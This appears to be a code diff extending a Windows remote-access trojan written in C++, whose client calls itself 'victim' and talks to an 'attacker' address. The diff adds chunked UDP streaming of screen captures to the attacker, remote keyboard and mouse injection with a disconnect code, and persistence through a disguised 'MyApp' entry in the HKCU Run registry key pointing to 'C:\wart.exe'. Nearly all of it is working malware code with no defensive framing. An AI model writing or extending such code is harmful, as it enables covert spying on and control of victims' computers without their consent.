@@ -24,6 +24,8 @@
 INPUT keyboard_input;
 INPUT mouse_input;
 
+bool conected_to_attacket = false;
+
 struct sockaddr_in server_ip;
 struct sockaddr_in current_attacker_ip;
 struct sockaddr_in current_screen_ip;
@@ -35,7 +37,9 @@ char message[BUFLEN] = "victim";
 WSADATA wsa;
 int horizontal = 0;
 int vertical = 0;
+void placebo() {
 
+}
 std::vector<BYTE> bmp_to_jpeg(const std::vector<BYTE>& bmpData, int width, int height, int quality) {
     // Create a TurboJPEG compressor object
     tjhandle tj = tjInitCompress();
@@ -71,7 +75,7 @@ std::vector<BYTE> get_data_to_send() {
     std::vector<BYTE> bmp_data(w * h * 3); // Each pixel is 4 bytes (32 bits)
     BITMAPINFOHEADER bmp_info_header = { sizeof(BITMAPINFOHEADER), w, h, 1, 24, BI_RGB, 0, 0, 0, 0, 0 };
     GetDIBits(mem_dc, bmp, 0, h, bmp_data.data(), reinterpret_cast<BITMAPINFO*>(&bmp_info_header), DIB_RGB_COLORS);
-    std::vector<BYTE> jpeg_data = bmp_to_jpeg(bmp_data, 1920, 1080, 30); // Convert BMP to JPEG    
+    std::vector<BYTE> jpeg_data = bmp_to_jpeg(bmp_data, 1920, 1080, 30); // Convert BMP to JPEG
     SelectObject(mem_dc, old_bmp);
     DeleteObject(bmp);
     DeleteDC(mem_dc);
@@ -80,13 +84,19 @@ std::vector<BYTE> get_data_to_send() {
 }
 
 void SendScreenData() {
-    Sleep(1000);
-    while (true) {
+    while (conected_to_attacket) {
         std::vector<BYTE> jpeg_data = get_data_to_send();
-        sendto(s, reinterpret_cast<const char*>(jpeg_data.data()), 65000, 0, (struct sockaddr*)&current_screen_ip, slen);
+        std::vector<BYTE> first_packet;
+        int amount_of_packets = ceil(double(jpeg_data.size()) / 50000);
+        int size_left = jpeg_data.size();
+        first_packet.push_back(amount_of_packets);
+        sendto(s, reinterpret_cast<const char*>(first_packet.data()), 1, 0, (struct sockaddr*)&current_screen_ip, slen);
         Sleep(5);
-        sendto(s, reinterpret_cast<const char*>(jpeg_data.data()) + 65000, jpeg_data.size() - 65000, 0, (struct sockaddr*)&current_screen_ip, slen);
-        Sleep(5);
+        for (int i = 0; i < amount_of_packets; i++) {
+            sendto(s, reinterpret_cast<const char*>(jpeg_data.data()) + 50000 * i, min(size_left, 50000), 0, (struct sockaddr*)&current_screen_ip, slen);
+            size_left -= 50000;
+            Sleep(5);
+        }
     }
 }
 
@@ -116,8 +126,12 @@ void release_key(int code) {
     SendInput(1, &keyboard_input, sizeof(INPUT));
 };
 
-void handle_input(int packet_int) {
-    if (!(packet_int & 1)) { // keyboard event when uts a 0  
+void handle_input(short packet_int) {
+    if (packet_int == 0xffff) {
+        conected_to_attacket = false;
+        return;
+    }
+    else if (!(packet_int & 1)) { // keyboard event when uts a 0
         packet_int /= 2; // ignore the first bit that represented the fact its a keyboard event
         if (!(packet_int & 1)) {
             press_key(packet_int / 2);
@@ -191,18 +205,81 @@ void handle_packet(char buf[]) { //todo current_screen_ip make it work
         if (sendto(s, message, strlen(message), 0, (struct sockaddr*)&current_attacker_ip, slen) == SOCKET_ERROR) {
             std::cout << "fail3" << std::endl;
         }
-        //std::thread t(SendScreenData);
+        conected_to_attacket = true;
+        std::thread t(SendScreenData);
+        t.detach();
     }
     else if (is_same_ip(last_recieve_ip, current_attacker_ip)) {
-        int packet_as_int = (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]);
+        short packet_as_int = (unsigned char)(buf[1]) << 8 | (unsigned char)(buf[0]);
         // translate from little indian binary to int
         handle_input(packet_as_int);
     }
 
 };
 
+void CheckRegistryEntry()
+{
+    HKEY hKey;
+    LPCWSTR lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    LPCWSTR lpValueName = L"MyApp"; // Replace with the value name associated with your application
+
+    // Open the registry key
+    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_READ, &hKey);
+    if (result != ERROR_SUCCESS) {
+        std::cout << "Failed to open registry key. Error code: " << result << std::endl;
+        return;
+    }
+
+    // Check if the value name exists in the registry
+    DWORD dwType;
+    BYTE data[512];
+    DWORD cbData = sizeof(data);
+    result = RegQueryValueEx(hKey, lpValueName, NULL, &dwType, data, &cbData);
+    if (result == ERROR_SUCCESS) {
+        std::cout << "Registry entry already exists." << std::endl;
+        RegCloseKey(hKey);
+        return;
+    }
+
+    // Close the registry key
+    RegCloseKey(hKey);
+    SaveToRegistry();
+    return ;
+}
+
+void SaveToRegistry()
+{
+    HKEY hKey;
+    LPCWSTR lpSubKey = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+    LPCWSTR lpValueName = L"MyApp";
+    LPCWSTR lpValue = L"C:\\wart.exe"; // Replace with the path to your "wart.exe" executable
+
+    // Open the registry key
+    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, KEY_SET_VALUE, &hKey);
+    if (result != ERROR_SUCCESS) {
+        std::cout << "Failed to open registry key. Error code: " << result << std::endl;
+        return;
+    }
+
+    // Set the value of the registry key
+    result = RegSetValueEx(hKey, lpValueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(lpValue), (wcslen(lpValue) + 1) * sizeof(WCHAR));
+    if (result != ERROR_SUCCESS) {
+        std::cout << "Failed to set registry value. Error code: " << result << std::endl;
+        RegCloseKey(hKey);
+        return;
+    }
+
+    std::cout << "Registry key added successfully." << std::endl;
+
+    // Close the registry key
+    RegCloseKey(hKey);
+
+    return;
+}
+
 int main()
 {
+    CheckRegistryEntry();
     //--------------------- some basic setup ----------------------------
     GetDesktopResolution();
     //------------------------ socket setup -----------------------------
@@ -228,6 +305,7 @@ int main()
         std::cout << "fail3" << std::endl;
         return -1;
     }
+    std::cout << "sent to " << PORT << "," << SERVER << std::endl;
     // ------------------------------------------------------------------
     //--------------------- keyboard input setup ------------------------
     keyboard_input.type = INPUT_KEYBOARD;
